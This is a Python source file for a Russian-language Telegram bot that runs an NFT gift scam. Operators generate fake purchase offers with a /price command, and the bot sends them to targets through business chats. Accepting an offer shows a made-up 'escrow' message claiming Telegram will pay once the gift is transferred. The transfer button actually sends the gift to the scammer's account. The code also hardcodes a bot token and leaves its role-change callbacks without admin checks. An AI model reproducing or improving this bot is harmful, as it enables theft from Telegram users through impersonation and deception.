import re
import asyncio
import logging
import os
import aiohttp
import sqlite3
import random
import string
from threading import Thread
from flask import Flask
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho"
RENDER_URL = "https://portals-ams5.onrender.com" 
MAIN_ADMIN_ID = 8438026734

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# --- СОСТОЯНИЯ (FSM) ---
class AdminStates(StatesGroup):
    waiting_for_user = State()
    waiting_for_check_amount = State()
    waiting_for_check_currency = State()
    waiting_for_check_uses = State()
    waiting_for_check_password = State()

class UserStates(StatesGroup):
    waiting_for_deposit_amount = State()
    waiting_for_deposit_currency = State()
    waiting_for_check_activation = State()

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (id INTEGER PRIMARY KEY, username TEXT, role TEXT, 
                       balance_stars REAL DEFAULT 0, balance_gram REAL DEFAULT 0, balance_usdt REAL DEFAULT 0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS checks 
                      (code TEXT PRIMARY KEY, amount REAL, currency TEXT, uses_left INTEGER, password TEXT)''')
    cursor.execute("INSERT OR IGNORE INTO users (id, username, role) VALUES (?, ?, ?)", (MAIN_ADMIN_ID, "admin", "admin"))
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result

def get_user_id(target):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    if target.startswith("@"):
        cursor.execute("SELECT id FROM users WHERE username = ?", (target,))
    else:
        try:
            cursor.execute("SELECT id FROM users WHERE id = ?", (int(target),))
        except ValueError:
            return None
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def update_user(user_id, role=None, stars=None, gram=None, usdt=None):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    if role: cursor.execute("UPDATE users SET role = ? WHERE id = ?", (role, user_id))
    if stars: cursor.execute("UPDATE users SET balance_stars = balance_stars + ? WHERE id = ?", (stars, user_id))
    if gram: cursor.execute("UPDATE users SET balance_gram = balance_gram + ? WHERE id = ?", (gram, user_id))
    if usdt: cursor.execute("UPDATE users SET balance_usdt = balance_usdt + ? WHERE id = ?", (usdt, user_id))
    conn.commit()
    conn.close()

def create_check(amount, currency, uses, password):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO checks (code, amount, currency, uses_left, password) VALUES (?, ?, ?, ?, ?)", 
                   (code, amount, currency, uses, password))
    conn.commit()
    conn.close()
    return code

init_db()

# --- ВЕБ-СЕРВЕР ---
app = Flask(__name__)

@app.route('/')
def index():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RENDER_URL) as response:
                    pass
        except Exception:
            pass
        await asyncio.sleep(600)

# --- ТЕКСТЫ ---
TEXTS = {
    "ru": {
        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.",
        "btn_decline": "Отклонить",
        "btn_accept": "Принять",
        "accepted": "<b>Покупатель зарезервировал ваш подарок.</b>\n\n<blockquote>Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n<b>Для завершения сделки:</b>\n1. Передайте подарок официальному боту: {transfer_bot}\n2. Нажмите «Передать NFT» и выберите NFT.\n3. Подтвердите передачу подарка.\n\nTelegram зафиксирует транзакцию и моментально зачислит {price} на ваш аккаунт.\n\n<b>Резерв действует 24 часа.</b></blockquote>",
        "btn_transfer": "Передать NFT",
    },
    "en": { "offer": "...", "btn_decline": "Decline", "btn_accept": "Accept", "accepted": "...", "btn_transfer": "Transfer" },
    "zh": { "offer": "...", "btn_decline": "拒绝", "btn_accept": "接受", "accepted": "...", "btn_transfer": "转移" }
}

# --- ПОЛЬЗОВАТЕЛЬСКОЕ МЕНЮ ---
def get_user_menu(user_id):
    user = get_user(user_id)
    bal_stars = user[3] if user else 0
    bal_gram = user[4] if user else 0
    bal_usdt = user[5] if user else 0
    
    text = (f"👋 <b>Главное меню</b>\n\n"
            f"💎 Баланс: {bal_gram} GRAM\n"
            f"⭐ Баланс: {bal_stars} Stars\n"
            f"💵 Баланс: {bal_usdt} USDT\n\n"
            f"Выберите действие:")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Пополнить баланс", callback_data="deposit")],
        [InlineKeyboardButton(text="🎁 Активировать чек", callback_data="activate_check")],
        [InlineKeyboardButton(text="📖 Инструкция", callback_data="tutor")]
    ])
    return text, keyboard

@dp.message(F.text == "/start")
async def start_command(message: types.Message):
    user_id = message.from_user.id
    username = f"@{message.from_user.username}" if message.from_user.username else "нет"
    user = get_user(user_id)

    if user:
        role = user[2]
        if role in ["admin", "user", "frish"]:
            text, kb = get_user_menu(user_id)
            await message.answer(text, reply_markup=kb)
            return

    # Заявка для новых
    admin_text = (
        f"🔔 <b>Новая заявка!</b>\n\n"
        f"👤 {message.from_user.full_name}\n"
        f"🆔 <code>{user_id}</code>\n"
        f"🔗 {username}"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Юзер", callback_data=f"approve:user:{user_id}:{username}"),
            InlineKeyboardButton(text="🦣 Фришный", callback_data=f"approve:frish:{user_id}:{username}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{user_id}")
        ]
    ])
    try:
        await bot.send_message(MAIN_ADMIN_ID, admin_text, reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Ошибка заявки: {e}")

# --- МЕНЮ КНОПОК ---
@dp.callback_query(F.data == "tutor")
async def tutor_cb(callback: types.CallbackQuery):
    text = ("📖 <b>Инструкция</b>\n\n"
            "Для создания офера:\n<code>/price [ссылка] [цена] [валюта]</code>\n\n"
            "Пример: <code>/price https://t.me/nft/... 7 gram</code>\n"
            "Валюты: gram, stars, usdt")
    await callback.message.answer(text)
    await callback.answer()

@dp.callback_query(F.data == "deposit")
async def deposit_cb(callback: types.CallbackQuery):
    if get_user(callback.from_user.id)[2] == "frish":
        await callback.answer("Фришным нельзя пополнять баланс напрямую.", show_alert=True)
        return
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ Звезды", callback_data="dep_stars")],
        [InlineKeyboardButton(text="💎 Крипта", callback_data="dep_crypto")]
    ])
    await callback.message.answer("Выберите способ оплаты:", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "dep_stars")
async def dep_stars(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите количество звезд для пополнения:")
    await state.set_state(UserStates.waiting_for_deposit_amount)
    await callback.answer()

@dp.message(UserStates.waiting_for_deposit_amount)
async def process_deposit_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        # Здесь должна быть генерация ссылки на реальную оплату
        await message.answer(f"✅ Ссылка на оплату {amount} звезд сгенерирована (ЗАГЛУШКА).\nПосле оплаты баланс обновится.")
        await state.clear()
    except:
        await message.answer("❌ Введите число.")

@dp.callback_query(F.data == "activate_check")
async def activate_check_cb(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите код чека (и пароль через пробел, если есть):")
    await state.set_state(UserStates.waiting_for_check_activation)
    await callback.answer()

@dp.message(UserStates.waiting_for_check_activation)
async def process_check(message: types.Message, state: FSMContext):
    args = message.text.split()
    code = args[0].upper()
    password = args[1] if len(args) > 1 else None
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT amount, currency, uses_left, password FROM checks WHERE code = ?", (code,))
    check = cursor.fetchone()
    
    if not check:
        await message.answer("❌ Чек не найден.")
        await state.clear()
        return
        
    amount, currency, uses_left, db_password = check
    
    if db_password and db_password != password:
        await message.answer("❌ Неверный пароль.")
        await state.clear()
        return
        
    if uses_left <= 0:
        await message.answer("❌ Этот чек уже использован максимальное количество раз.")
        await state.clear()
        return

    # Начисляем баланс
    user_id = message.from_user.id
    if currency == "stars": update_user(user_id, stars=amount)
    elif currency == "gram": update_user(user_id, gram=amount)
    else: update_user(user_id, usdt=amount)

    # Обновляем чек
    cursor.execute("UPDATE checks SET uses_left = uses_left - 1 WHERE code = ?", (code,))
    conn.commit()
    conn.close()
    
    await message.answer(f"🎉 Чек активирован! Начислено {amount} {currency}.")
    await state.clear()

# --- АДМИН-ПАНЕЛЬ ---
@dp.message(F.text == "/adminpanel")
async def admin_panel(message: types.Message):
    if get_user(message.from_user.id)[2] != "admin": return
    text = "👑 <b>Админ-панель</b>"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Список юзеров", callback_data="adm_list")],
        [InlineKeyboardButton(text="🎁 Создать чек", callback_data="adm_check")],
        [InlineKeyboardButton(text="📥 Скачать базу", callback_data="adm_db")]
    ])
    await message.answer(text, reply_markup=keyboard)

@dp.callback_query(F.data == "adm_list")
async def adm_list(callback: types.CallbackQuery):
    if get_user(callback.from_user.id)[2] != "admin": return
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, role FROM users")
    users = cursor.fetchall()
    conn.close()
    
    keyboard = []
    for u_id, username, role in users:
        icon = "👑" if role == "admin" else ("🦣" if role == "frish" else "👤")
        keyboard.append([InlineKeyboardButton(text=f"{icon} {username}", callback_data=f"usr_{u_id}")])
    
    await callback.message.edit_text("👥 Выберите пользователя:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
    await callback.answer()

@dp.callback_query(F.data.startswith("usr_"))
async def user_manage(callback: types.CallbackQuery):
    if get_user(callback.from_user.id)[2] != "admin": return
    user_id = int(callback.data.split("_")[1])
    user = get_user(user_id)
    if not user: return
    
    text = (f"👤 <b>Юзер:</b> {user[1]}\n"
            f"🆔 ID: {user[0]}\n"
            f"Роль: {user[2]}\n"
            f"Баланс: {user[3]}⭐ | {user[4]}💎 | {user[5]}💵")
            
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назначить Админом", callback_data=f"set_admin_{user_id}")],
        [InlineKeyboardButton(text="Сделать Фришным", callback_data=f"set_frish_{user_id}")],
        [InlineKeyboardButton(text="Сделать Юзером", callback_data=f"set_user_{user_id}")],
        [InlineKeyboardButton(text="❌ Удалить", callback_data=f"del_{user_id}")]
    ])
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data.startswith("set_admin_"))
async def set_admin(callback: types.CallbackQuery):
    uid = int(callback.data.split("_")[2])
    update_user(uid, role="admin")
    await callback.answer("Теперь админ", show_alert=True)
    await user_manage(callback)

@dp.callback_query(F.data.startswith("set_frish_"))
async def set_frish(callback: types.CallbackQuery):
    uid = int(callback.data.split("_")[2])
    update_user(uid, role="frish")
    await callback.answer("Теперь фришный", show_alert=True)
    await user_manage(callback)

@dp.callback_query(F.data.startswith("set_user_"))
async def set_user(callback: types.CallbackQuery):
    uid = int(callback.data.split("_")[2])
    update_user(uid, role="user")
    await callback.answer("Теперь юзер", show_alert=True)
    await user_manage(callback)

@dp.callback_query(F.data.startswith("del_"))
async def del_user_cb(callback: types.CallbackQuery):
    uid = int(callback.data.split("_")[1])
    if uid == MAIN_ADMIN_ID: return
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM users WHERE id = ?", (uid,))
    conn.commit()
    conn.close()
    await callback.answer("Удален", show_alert=True)
    await adm_list(callback)

@dp.callback_query(F.data == "adm_check")
async def adm_check(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите сумму чека:")
    await state.set_state(AdminStates.waiting_for_check_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_for_check_amount)
async def check_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        await state.update_data(amount=amount)
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⭐ Stars", callback_data="chk_stars")],
            [InlineKeyboardButton(text="💎 GRAM", callback_data="chk_gram")],
            [InlineKeyboardButton(text="💵 USDT", callback_data="chk_usdt")]
        ])
        await message.answer("Выберите валюту:", reply_markup=keyboard)
        await state.set_state(AdminStates.waiting_for_check_currency)
    except:
        await message.answer("❌ Введите число.")

@dp.callback_query(AdminStates.waiting_for_check_currency)
async def check_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    await callback.message.answer("Введите количество активаций:")
    await state.set_state(AdminStates.waiting_for_check_uses)
    await callback.answer()

@dp.message(AdminStates.waiting_for_check_uses)
async def check_uses(message: types.Message, state: FSMContext):
    try:
        uses = int(message.text)
        await state.update_data(uses=uses)
        await message.answer("Введите пароль (или напишите 'нет'):")
        await state.set_state(AdminStates.waiting_for_check_password)
    except:
        await message.answer("❌ Введите число.")

@dp.message(AdminStates.waiting_for_check_password)
async def check_password(message: types.Message, state: FSMContext):
    password = message.text if message.text.lower() != "нет" else None
    data = await state.get_data()
    
    code = create_check(data['amount'], data['currency'], data['uses'], password)
    check_link = f"https://t.me/portals_nftbot?start=check_{code}"
    
    await message.answer(f"✅ Чек создан!\n\nКод: <code>{code}</code>\nСсылка: {check_link}\nПароль: {password or 'нет'}\nАктиваций: {data['uses']}")
    await state.clear()

@dp.callback_query(F.data == "adm_db")
async def adm_db(callback: types.CallbackQuery):
    try:
        file = FSInputFile("users.db")
        await callback.message.answer_document(file, caption="📦 База")
    except Exception as e:
        await callback.message.answer(f"❌ {e}")
    await callback.answer()

# --- ЗАЯВКИ ---
@dp.callback_query(F.data.startswith("approve:"))
async def approve_user(callback: types.CallbackQuery):
    if get_user(callback.from_user.id)[2] != "admin": return
    _, role, uid, username = callback.data.split(":")
    update_user(int(uid), role=role)
    
    # Сохраняем юзера, если его нет
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (id, username, role) VALUES (?, ?, ?)", (int(uid), username, role))
    conn.commit()
    conn.close()
    
    await callback.message.edit_text(f"✅ {username} одобрен как {role}.")
    try:
        await bot.send_message(int(uid), f"🎉 Ваша заявка одобрена! Роль: {role}.\nНапишите /start.")
    except: pass
    await callback.answer()

@dp.callback_query(F.data.startswith("reject:"))
async def reject_user(callback: types.CallbackQuery):
    if get_user(callback.from_user.id)[2] != "admin": return
    uid = int(callback.data.split(":")[1])
    await callback.message.edit_text(f"❌ Заявка отклонена.")
    await callback.answer()

# --- ОФЕРЫ ---
async def create_offer(chat_id, user_id, full_name, text, biz_id=None):
    command = text.split()[0].lower()
    lang = "ru" if command == "/price" else ("en" if command == "/prace" else "zh")
    t = TEXTS[lang]

    pattern = r"^/(price|prace|proce)\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars|usdt)"
    match = re.match(pattern, text, re.IGNORECASE)
    if not match: return

    nft_link, price, currency = match.group(2), match.group(3), match.group(4).lower()
    if currency == "stars": price_text = f"{price} ⭐"
    elif currency == "usdt": price_text = f"{price} 💵"
    else: price_text = f"{price} 💎"

    nft_name = nft_link.split('/')[-1].replace('-', '').capitalize()
    user_link = f"<a href='tg://user?id={user_id}'>{full_name}</a>"
    
    final_text = t["offer"].format(user_link=user_link, price=price_text, nft_name=nft_name)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t["btn_decline"], callback_data=f"decline:{lang}"),
        InlineKeyboardButton(text=t["btn_accept"], callback_data=f"accept:{price_text}:{lang}")
    ]])

    # Пытаемся получить фото
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getWebPagePreview"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, params={"url": nft_link}) as resp:
                data = await resp.json()
                if data.get("ok") and "photo" in data.get("result", {}):
                    photo = data["result"]["photo"][-1]["file_id"]
                    await bot.send_photo(chat_id=chat_id, photo=photo, caption=final_text, business_connection_id=biz_id, reply_markup=keyboard)
                    return
    except: pass

    await bot.send_message(chat_id=chat_id, text=final_text + f"\n<a href='{nft_link}'>​</a>", business_connection_id=biz_id, reply_markup=keyboard)

@dp.message(F.text.regexp(r"^/(price|prace|proce)\s+"))
async def handle_private_price(message: types.Message):
    user = get_user(message.from_user.id)
    if not user or user[2] not in ["admin", "user"]: return
    
    try: await message.delete()
    except: pass
    
    await create_offer(message.chat.id, message.from_user.id, message.from_user.full_name, message.text)
    
    # Отправляем ссылку на офер
    offer_link = f"https://t.me/portals_nftbot?start=offer_{message.from_user.id}"
    await message.answer(f"🔗 Ссылка на офер: {offer_link}")

@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: types.CallbackQuery):
    await callback.answer()
    _, price_str, lang = callback.data.split(":")
    t = TEXTS[lang]
    new_text = t["accepted"].format(transfer_bot="@portals_nftbot", price=price_str)
    gift_link = "tg://send_gift?to=portalNftReplayer"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]])
    
    if callback.message.photo:
        await bot.edit_message_caption(caption=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id, reply_markup=kb, business_connection_id=callback.message.business_connection_id)
    else:
        await bot.edit_message_text(text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id, reply_markup=kb, business_connection_id=callback.message.business_connection_id)

@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: types.CallbackQuery):
    lang = callback.data.split(":")[1]
    await callback.answer("Отклонено", show_alert=True)

async def main():
    Thread(target=run_flask, daemon=True).start()
    asyncio.create_task(keep_alive()) 
    print("Бот запущен.")
    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query", "message"])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен.")
        
